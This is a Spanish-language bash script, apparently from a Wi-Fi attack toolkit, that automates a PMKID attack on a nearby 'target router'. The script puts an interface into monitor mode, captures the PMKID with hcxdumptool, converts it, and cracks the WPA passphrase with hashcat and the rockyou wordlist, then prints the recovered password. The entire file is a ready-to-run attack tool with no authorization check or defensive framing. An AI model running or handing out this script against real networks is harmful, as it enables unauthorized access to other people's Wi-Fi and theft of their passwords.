#!/bin/bash
# PMKID Attack - Sin clientes conectados necesarios

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && cd .. && pwd)"
LOG_FILE="$SCRIPT_DIR/logs/pmkid_$(date +%Y%m%d_%H%M%S).log"
WORDLIST="$SCRIPT_DIR/wordlists/rockyou.txt"

clear
echo -e "${RED}"
cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║                      PMKID ATTACK                            ║
╚══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo -e "${CYAN}Descripción:${NC}"
echo "  • NO requiere clientes conectados"
echo "  • Captura PMKID del router"
echo "  • Crackea con GPU (hashcat)"
echo "  • ${YELLOW}Requiere wordlist${NC}"
echo ""

# Verificar herramientas
if ! command -v hcxdumptool &>/dev/null; then
    echo -e "${RED}[!] hcxdumptool no instalado${NC}"
    echo -e "${YELLOW}[*] Ejecuta: sudo ./install.sh${NC}"
    exit 1
fi

# Detectar interfaz
echo -e "${CYAN}[*] Interfaces WiFi disponibles:${NC}"
airmon-ng
echo ""
read -p "Interfaz a usar (ej: wlan0): " interface

if [ -z "$interface" ]; then
    echo -e "${RED}[!] Interfaz no especificada${NC}"
    exit 1
fi

# Modo monitor
echo -e "${YELLOW}[*] Activando modo monitor...${NC}"
airmon-ng check kill &>/dev/null
airmon-ng start $interface &>/dev/null
monitor="${interface}mon"
echo -e "${GREEN}[✓] Modo monitor: $monitor${NC}"
echo ""

# Capturar PMKID
echo -e "${CYAN}[*] Capturando PMKID (60 segundos)...${NC}"
echo -e "${YELLOW}[*] Acércate al router objetivo${NC}"
echo ""

timeout 60 hcxdumptool -i $monitor -o pmkid_capture.pcapng --enable_status=1

# Convertir
echo ""
echo -e "${YELLOW}[*] Convirtiendo captura...${NC}"
hcxpcapngtool -o pmkid.hash pmkid_capture.pcapng

if [ ! -f "pmkid.hash" ] || [ ! -s "pmkid.hash" ]; then
    echo -e "${RED}[!] No se capturó PMKID${NC}"
    echo -e "${YELLOW}[*] Posibles causas:${NC}"
    echo "  - Router no vulnerable"
    echo "  - Muy lejos del objetivo"
    echo "  - Router con PMKID deshabilitado"
    airmon-ng stop $monitor &>/dev/null
    exit 1
fi

echo -e "${GREEN}[✓] PMKID capturado!${NC}"
echo ""
cat pmkid.hash
echo ""

# Verificar wordlist
if [ ! -f "$WORDLIST" ]; then
    echo -e "${YELLOW}[!] Wordlist no encontrado${NC}"
    read -p "Ruta al wordlist: " custom_wordlist
    if [ -f "$custom_wordlist" ]; then
        WORDLIST="$custom_wordlist"
    else
        echo -e "${RED}[!] Wordlist inválido${NC}"
        airmon-ng stop $monitor &>/dev/null
        exit 1
    fi
fi

# Crackear
echo -e "${CYAN}[*] Iniciando crackeo con Hashcat...${NC}"
echo -e "${YELLOW}[*] Presiona 's' para ver status${NC}"
echo ""

hashcat -m 22000 pmkid.hash "$WORDLIST" --force -o pmkid_cracked.txt

echo ""
if [ -f "pmkid_cracked.txt" ]; then
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║              ✓ CONTRASEÑA ENCONTRADA!                        ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    cat pmkid_cracked.txt
    echo ""
else
    echo -e "${YELLOW}[*] Contraseña no encontrada en wordlist${NC}"
    echo -e "${CYAN}[*] Prueba con wordlist más grande${NC}"
fi

# Restaurar
airmon-ng stop $monitor &>/dev/null

echo ""
echo -e "${CYAN}[*] Log: $LOG_FILE${NC}"
read -p "Presiona Enter para continuar..."
